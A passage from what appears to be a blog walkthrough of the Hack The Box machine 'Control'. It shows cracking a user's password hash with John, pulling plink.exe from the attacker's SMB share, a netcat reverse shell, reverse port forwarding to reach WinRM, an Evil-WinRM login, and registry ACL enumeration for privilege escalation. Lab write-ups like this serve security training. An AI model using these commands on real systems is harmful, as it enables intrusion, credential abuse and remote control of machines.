class="number">42</span> PM           <span class="number">4056</span> update_product.php                                                    </span><br><span class="line">------        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">42</span> PM           <span class="number">2933</span> view_product.php                                                      </span><br><span class="line">-a----        <span class="number">4</span>/<span class="number">25</span>/<span class="number">2020</span>   <span class="number">1</span>:<span class="number">46</span> AM           <span class="number">7205</span> webshell.php                                                          </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\inetpub\wwwroot&gt;</span><br></pre></td></tr></table></figure><h3 id="Decrypt-password-Hector"><a href="#Decrypt-password-Hector" class="headerlink" title="Decrypt password Hector"></a>Decrypt password Hector</h3><p>I need to do <strong>Privilege Escalation</strong> for user Hector, remember that I get his password hash when I run <code>SQLMap</code> right ? so I decrypt it with <strong>John</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Control via üêò v7.3.15 </span><br><span class="line">‚ùØ john <span class="built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=4</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">l33th4x0rhector  (?)</span><br><span class="line">1g 0:00:00:00 DONE (2020-04-25 06:58) 1.562g/s 10004Kp/s 10004Kc/s 10004KC/s l33thax0r..l33th4ck3r</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Control via üêò v7.3.15 </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>well it‚Äôs fast I get easily the password <strong><code>l33th4x0rhector</code></strong>.<br>SMB is not active in the machine, no PSExec too but we can use <strong>Evil-WinRM</strong> to move laterall to user <code>Hector</code>.</p><h3 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h3><p><strong>Evil-WinRM</strong> is active for localhost, we can create a tunnel and access it from my host, so I looked on the port that I can use for <strong>Portforwarding</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt; netstat -ano</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State           PID</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       780</span><br><span class="line">  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1960</span><br><span class="line">  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       456</span><br><span class="line">  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1004</span><br><span class="line">  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       984</span><br><span class="line">  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1796</span><br><span class="line">  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       584</span><br><span class="line">  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       592</span><br></pre></td></tr></table></figure><p>To create a tunnel in order to access the <strong>WinRM</strong> port I used the binary <code>plink.exe</code> and port <code>5985</code>. I copy it using samba :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">PS C:\inetpub\wwwroot&gt; <span class="built_in">cd</span> \payas0</span><br><span class="line"><span class="built_in">cd</span> \payas0</span><br><span class="line">PS C:\payas0&gt; copy \\10.10.15.102\medz\plink.exe</span><br><span class="line">copy \\10.10.15.102\medz\plink.exe</span><br><span class="line">PS C:\payas0&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\payas0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">d-----        4/25/2020   1:57 AM                Microsoft                                                             </span><br><span class="line">-a----        4/25/2020  12:45 AM          59392 nc.exe                                                                </span><br><span class="line">-a----        4/25/2020   1:59 AM         311296 plink.exe                                                             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt;</span><br></pre></td></tr></table></figure><p>Now let‚Äôs do the portforwarding</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Control via üêò v7<span class="number">.3</span><span class="number">.15</span> took <span class="number">19</span>m42s </span><br><span class="line">‚ùØ nc -nlvp <span class="number">9001</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">9001</span> ...</span><br><span class="line">connect <span class="keyword">to</span> [<span class="number">10.10</span><span class="number">.15</span><span class="number">.102</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.10</span><span class="number">.167</span>] <span class="number">54867</span></span><br><span class="line">Windows PowerShell </span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt; .\plink.exe -l nulldev -pw nulldev -R <span class="number">5985</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5985</span> <span class="number">10.10</span><span class="number">.15</span><span class="number">.102</span></span><br><span class="line">.\plink.exe -l nulldev -pw nulldev -R <span class="number">5985</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5985</span> <span class="number">10.10</span><span class="number">.15</span><span class="number">.102</span></span><br><span class="line">The server's host key <span class="keyword">is</span> <span class="keyword">not</span> cached <span class="keyword">in</span> <span class="keyword">the</span> registry. You</span><br><span class="line">have no guarantee <span class="keyword">that</span> <span class="keyword">the</span> server <span class="keyword">is</span> <span class="keyword">the</span> computer you</span><br><span class="line">think <span class="keyword">it</span> <span class="keyword">is</span>.</span><br><span class="line">The server's rsa2 key fingerprint <span class="keyword">is</span>:</span><br><span class="line">ssh-rsa <span class="number">2048</span> <span class="number">81</span>:c9:<span class="number">32</span>:<span class="number">5</span>d:<span class="number">2</span>e:<span class="number">03</span>:<span class="number">3</span>c:<span class="number">1</span>d:<span class="number">72</span>:<span class="number">8</span>a:<span class="number">54</span>:<span class="number">45</span>:ed:<span class="number">0</span>b:<span class="number">08</span>:<span class="number">4</span>b</span><br><span class="line">If you trust this host, enter <span class="string">"y"</span> <span class="keyword">to</span> add <span class="keyword">the</span> key <span class="keyword">to</span></span><br><span class="line">PuTTY's cache <span class="keyword">and</span> carry <span class="keyword">on</span> connecting.</span><br><span class="line">If you want <span class="keyword">to</span> carry <span class="keyword">on</span> connecting just once, <span class="keyword">without</span></span><br><span class="line">adding <span class="keyword">the</span> key <span class="keyword">to</span> <span class="keyword">the</span> cache, enter <span class="string">"n"</span>.</span><br><span class="line">If you do <span class="keyword">not</span> trust this host, press Return <span class="keyword">to</span> abandon <span class="keyword">the</span></span><br><span class="line">connection.</span><br><span class="line">Store key <span class="keyword">in</span> cache? (y/n) y</span><br><span class="line">Linux Payas0 <span class="number">5.4</span><span class="number">.0</span>-kali2-amd64 <span class="comment">#1 SMP Debian 5.4.8-1kali1 (2020-01-06) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> <span class="keyword">the</span> Kali GNU/Linux system are free software;</span><br><span class="line"><span class="keyword">the</span> exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> <span class="keyword">the</span></span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> <span class="keyword">the</span> extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sat Apr <span class="number">25</span> <span class="number">07</span>:<span class="number">05</span>:<span class="number">17</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.167</span></span><br><span class="line">Could <span class="keyword">not</span> chdir <span class="keyword">to</span> home directory /home/nulldev: No such <span class="built_in">file</span> <span class="keyword">or</span> directory</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1000</span>(nulldev) gid=<span class="number">1000</span>(nulldev) groups=<span class="number">1000</span>(nulldev)</span><br><span class="line">$ su root</span><br><span class="line">su root</span><br><span class="line">Password:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nulldev <span class="keyword">on</span> Payas0 <span class="keyword">in</span> </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Success ! Now i can use <strong>Evil-WinRM</strong> to login as <code>Hector</code> and get the <code>user.txt</code></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">nulldev on Payas0 <span class="keyword">in</span> evil-winrm on master via üíé v2.5.7 </span><br><span class="line">‚ùØ ./evil-winrm.rb -i 127.0.0.1 -u Hector -p <span class="string">'l33th4x0rhector'</span> -s <span class="string">'./'</span> -e <span class="string">'./'</span></span><br><span class="line">./evil-winrm.rb -i 127.0.0.1 -u Hector -p <span class="string">'l33th4x0rhector'</span> -s <span class="string">'./'</span> -e <span class="string">'./'</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.3</span><br><span class="line"></span><br><span class="line">Info: Establishing<span class="built_in"> connection </span><span class="keyword">to</span> remote endpoint</span><br><span class="line"></span><br><span class="line"><span class="number">*E</span>vil-WinRM* PS C:\Users\Hector\Documents&gt; cd <span class="built_in">..</span>/Desktop</span><br><span class="line">cd <span class="built_in">..</span>/Desktop</span><br><span class="line"><span class="number">*E</span>vil-WinRM* PS C:\Users\Hector\Desktop&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Hector\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        11/1/2019  12:33 PM             32 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">*E</span>vil-WinRM* PS C:\Users\Hector\Desktop&gt; more user.txt</span><br><span class="line">more user.txt</span><br><span class="line">d8782[---------------------]d472b</span><br><span class="line"></span><br><span class="line"><span class="number">*E</span>vil-WinRM* PS C:\Users\Hector\Desktop&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Root-phase"><a href="#Root-phase" class="headerlink" title="Root phase"></a>Root phase</h3><p>In the <strong>root</strong> I dig deeply, the only I get from the help of other players is the <strong><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists" target="_blank" rel="noopener">ACL or Access Control List</a></strong> that I need to pay attention the services configurations are inside that registry so :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Hector\Desktop&gt; Get-Content C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">Get-Content C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">get-childitem HKLM:\SYSTEM\CurrentControlset | format-list</span><br><span class="line">get-acl HKLM:\SYSTEM\CurrentControlSet | format-list</span><br><span class="line">*Evil-WinRM* PS C:\Users\Hector\Desktop&gt;</span><br></pre></td></tr></table></figure><h3 id="Full-Control-in-Services"><a href="#Full-Control-in-Services" class="headerlink" title="Full Control in Services"></a>Full Control in Services</h3><p>Next is to enumerate all <strong>Full Control &amp; Services</strong> of <code>Hector</code> using this commands :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i <span class="string">"Hector Users Path"</span></span><br></pre></td></tr></table></figure><p>run the command and we can get this :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Hector\Desktop&gt; get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i <span class="string">"Hector Users Path"</span></span><br><span class="line">get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i <span class="string">"Hector Users Path"</span></span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET CLR Data</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET CLR Data</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET CLR Networking</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET CLR Networking</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET CLR Networking 4.0.0.0</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET CLR Networking 4.0.0.0</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET Data Provider <span class="keyword">for</span> Oracle</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET Data Provider <span class="keyword">for</span> Oracle</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET Data Provider <span class="keyword">for</span> SqlServer</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET Data Provider <span class="keyword">for</span> SqlServer</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET Memory Cache 4.0</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET Memory Cache 4.0</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NETFramework</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NETFramework</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\1394ohci</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\1394ohci</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\3ware</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\3ware</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ACPI</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ACPI</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AcpiDev</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AcpiDev</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\acpiex</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\acpiex</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\acpipagr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\acpipagr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AcpiPmi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AcpiPmi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\acpitime</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\acpitime</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ADOVMPPackage</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ADOVMPPackage</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ADP80XX</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ADP80XX</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\adsi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\adsi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ADWS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ADWS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AFD</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AFD</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\afunix</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\afunix</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ahcache</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ahcache</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AJRouter</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AJRouter</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ALG</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ALG</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AmdK8</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AmdK8</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AmdPPM</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AmdPPM</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\amdsata</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\amdsata</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\amdsbs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\amdsbs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\amdxata</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\amdxata</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppHostSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\AppHostSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  